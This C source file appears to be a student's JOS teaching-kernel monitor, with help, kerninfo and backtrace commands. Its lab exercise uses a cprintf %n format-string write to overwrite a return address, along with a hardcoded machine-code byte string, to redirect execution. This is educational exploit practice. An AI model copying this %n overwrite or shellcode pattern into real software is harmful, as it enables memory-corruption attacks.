// Simple command-line kernel monitor useful for
// controlling the kernel and exploring the system interactively.

#include <inc/stdio.h>
#include <inc/string.h>
#include <inc/memlayout.h>
#include <inc/assert.h>
#include <inc/x86.h>

#include <kern/console.h>
#include <kern/monitor.h>
#include <kern/kdebug.h>

#define CMDBUF_SIZE	80	// enough for one VGA text line


struct Command {
	const char *name;
	const char *desc;
	// return -1 to force monitor to exit
	int (*func)(int argc, char** argv, struct Trapframe* tf);
};

static struct Command commands[] = {
	{ "help", "Display this list of commands", mon_help },
	{ "kerninfo", "Display information about the kernel", mon_kerninfo },
	{	"backtrace", "Backtrace calling stack", mon_backtrace },
};

/***** Implementations of basic kernel monitor commands *****/

int
mon_help(int argc, char **argv, struct Trapframe *tf)
{
	int i;

	for (i = 0; i < ARRAY_SIZE(commands); i++)
		cprintf("%s - %s\n", commands[i].name, commands[i].desc);
	return 0;
}

int
mon_kerninfo(int argc, char **argv, struct Trapframe *tf)
{
	extern char _start[], entry[], etext[], edata[], end[];

	cprintf("Special kernel symbols:\n");
	cprintf("  _start                  %08x (phys)\n", _start);
	cprintf("  entry  %08x (virt)  %08x (phys)\n", entry, entry - KERNBASE);
	cprintf("  etext  %08x (virt)  %08x (phys)\n", etext, etext - KERNBASE);
	cprintf("  edata  %08x (virt)  %08x (phys)\n", edata, edata - KERNBASE);
	cprintf("  end    %08x (virt)  %08x (phys)\n", end, end - KERNBASE);
	cprintf("Kernel executable memory footprint: %dKB\n",
		ROUNDUP(end - entry, 1024) / 1024);
	return 0;
}

// Lab1 only
// read the pointer to the retaddr on the stack
static uint32_t
read_pretaddr() {
    uint32_t pretaddr;
    __asm __volatile("leal 4(%%ebp), %0" : "=r" (pretaddr)); 
    return pretaddr;
}

void
do_overflow(void)
{
    cprintf("Overflow success\n");
}

void
start_overflow(void)
{
	// You should use a techique similar to buffer overflow
	// to invoke the do_overflow function and
	// the procedure must return normally.

    // And you must use the "cprintf" function with %n specifier
    // you augmented in the "Exercise 9" to do this job.

    // hint: You can use the read_pretaddr function to retrieve 
    //       the pointer to the function call return address;

    char str[256] = {};
    int nstr = 0;
    char *pret_addr;

	// Your code here.
	uint32_t addr = read_pretaddr();
	memset(str, 0xd, 255);
	str[255] = '\0';
	str[0xfc] = '\0';
	cprintf("%s%n", str, addr + 1);
	str[0xa0] = '\0';
	cprintf("%s%n", str, addr);
	memset(str, '\0', 255);
	const char *malwarm = 
	"\x81\xec\x10\x01\x00\x00\xe8\x93\x0b\xff\xff\x81\xc4\x10\x01\x00\x00\xe9\xff\x0c\xff\xff";
	memcpy(str, malwarm, 24);
	// strcpy(str , "\xff\x15\x0d\x09\x10\xf0\xff\x25\x2a\x09\x10\xf0");
	if (str[16] != malwarm[16]) {
		cprintf("%s", "");
	}
}

void
overflow_me(void)
{
        start_overflow();
}

int
mon_backtrace(int argc, char **argv, struct Trapframe *tf)
{
	// Your code here.
	cprintf("Stack backtrace:\n");
	uint32_t ebp;
	ebp = read_ebp();
	while (ebp != 0) {
		uint32_t retaddr = *((uint32_t *)ebp + 1);
		uint32_t args[5];
		memcpy(args, (uint32_t *)ebp + 2, 5 * 4);
		cprintf("  eip %08x  ebp %08x  args %08x %08x %08x %08x %08x\n", 
		retaddr, ebp, args[0], args[1], args[2], args[3], args[4]);
		
		// get debug info
		struct Eipdebuginfo dbginfo;
		int found = debuginfo_eip(retaddr, &dbginfo);
		cprintf("         %s:%d ", dbginfo.eip_file, dbginfo.eip_line);
		for (int idx = 0; idx != dbginfo.eip_fn_namelen; idx++) {
			cprintf("%c", dbginfo.eip_fn_name[idx]);
		}
		cprintf("+%d\n", retaddr - dbginfo.eip_fn_addr);
		// cprintf("         %s:%ud %s%+d\n", 
		// dbginfo.eip_file, dbginfo.eip_fn_addr, dbginfo.eip_fn_name, dbginfo.eip_line);

		ebp = *((uint32_t *)ebp);
	}
	overflow_me();
    	cprintf("Backtrace success\n");
	return 0;
}



/***** Kernel monitor command interpreter *****/

#define WHITESPACE "\t\r\n "
#define MAXARGS 16

static int
runcmd(char *buf, struct Trapframe *tf)
{
	int argc;
	char *argv[MAXARGS];
	int i;

	// Parse the command buffer into whitespace-separated arguments
	argc = 0;
	argv[argc] = 0;
	while (1) {
		// gobble whitespace
		while (*buf && strchr(WHITESPACE, *buf))
			*buf++ = 0;
		if (*buf == 0)
			break;

		// save and scan past next arg
		if (argc == MAXARGS-1) {
			cprintf("Too many arguments (max %d)\n", MAXARGS);
			return 0;
		}
		argv[argc++] = buf;
		while (*buf && !strchr(WHITESPACE, *buf))
			buf++;
	}
	argv[argc] = 0;

	// Lookup and invoke the command
	if (argc == 0)
		return 0;
	for (i = 0; i < ARRAY_SIZE(commands); i++) {
		if (strcmp(argv[0], commands[i].name) == 0)
			return commands[i].func(argc, argv, tf);
	}
	cprintf("Unknown command '%s'\n", argv[0]);
	return 0;
}

void
monitor(struct Trapframe *tf)
{
	char *buf;

	cprintf("Welcome to the JOS kernel monitor!\n");
	cprintf("Type 'help' for a list of commands.\n");


	while (1) {
		buf = readline("K> ");
		if (buf != NULL)
			if (runcmd(buf, tf) < 0)
				break;
	}
}
